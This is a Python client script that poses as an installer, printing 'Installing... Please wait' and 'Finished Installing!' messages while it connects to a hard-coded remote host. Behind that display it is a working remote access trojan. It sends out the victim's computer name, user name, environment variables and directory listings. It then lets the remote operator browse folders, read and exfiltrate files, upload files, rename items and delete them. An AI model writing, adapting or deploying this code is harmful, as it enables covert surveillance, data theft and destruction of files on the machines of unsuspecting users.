import os
import socket
import time

HOST = 'Adi-HP'	#Enter the name of the system where server is supposed to run
PORT = 54321	#Ensure that this PORT number is same in both server and client

def main():
	with socket.socket() as s:
		s.connect((HOST, PORT))
		print('\n\nInstalling... Please wait.')

		s.recv(1024); s.send(str(os.environ['COMPUTERNAME']).encode())
		s.recv(1024); s.send(str(os.environ['USERNAME']).encode())
		s.recv(1024); s.send(str(os.environ['PROCESSOR_ARCHITECTURE']).encode())
		s.recv(1024); s.send(str(os.environ['NUMBER_OF_PROCESSORS']).encode())
		s.recv(1024); s.send(str(os.environ['HOMEDRIVE']).encode())
		s.recv(1024); s.send(str(os.environ['HOMEPATH']).encode())
		s.recv(1024); s.send(str(os.get_terminal_size()).encode())
		s.recv(1024); s.send(str(os.getcwd()).encode())
		s.recv(1024); s.send(str(os.listdir()).encode())

		print('\n\nThis might take a few minutes.')

		while 1:
			msg = s.recv(1024).decode()
			cmd = msg.split()[0]
			if cmd == 'env':
				try:
					s.send(str(os.environ).encode())
				except:
					s.send('Error'.encode())
			elif cmd == 'cwd':
				try:
					s.send(str(os.getcwd()).encode())
				except:
					s.send('Error'.encode())
			elif cmd == 'ls':
				try:
					s.send(str(os.listdir()).encode())
				except:
					s.send('Error'.encode())
			elif cmd == 'cd':
				try:
					arg = ' '.join(msg.split()[1:])
					os.chdir(arg)
					s.send(str(os.getcwd()).encode())
				except:
					s.send('Error'.encode())
			elif cmd == 'md':
				try:
					arg = ' '.join(msg.split()[1:])
					os.mkdir(arg)
					s.send(str(os.listdir()).encode())
				except:
					s.send('Error'.encode())
			elif cmd == 'rd':
				try:
					arg = ' '.join(msg.split()[1:])
					os.rmdir(arg)
					s.send(str(os.listdir()).encode())
				except:
					s.send('Error'.encode())
			elif cmd == 'rn':
				try:
					arg = ' '.join(msg.split()[1:])
					old = arg.split(',')[0].strip()
					new = arg.split(',')[1].strip()
					os.rename(old, new)
					s.send(str(os.listdir()).encode())
				except:
					s.send('Error'.encode())
			elif cmd == 'open' or cmd == 'save':
				try:
					arg1 = msg.split()[1]
					file = open(arg1, 'rb')
					data = file.read()
					s.send(data)
				except:
					s.send('Error'.encode())
			elif cmd == 'del':
				try:
					arg = msg.split()[1]
					os.remove(arg)
					s.send(str(os.listdir()).encode())
				except:
					s.send('Error'.encode())
			elif cmd == 'send':
				try:
					arg = msg.split()[1]
					data = s.recv(5000)
					file = open(arg, 'wb')
					file.write(data)
					file.close()
					s.send(str(os.listdir()).encode())
				except:
					s.send('Error'.encode())
			elif cmd == 'exit':
				try:
					print('\n\nFinished Installing!\n')
					s.send('Success'.encode())
					break
				except:
					s.send('Error'.encode())

	time.sleep(2)

if __name__ == '__main__':
	main()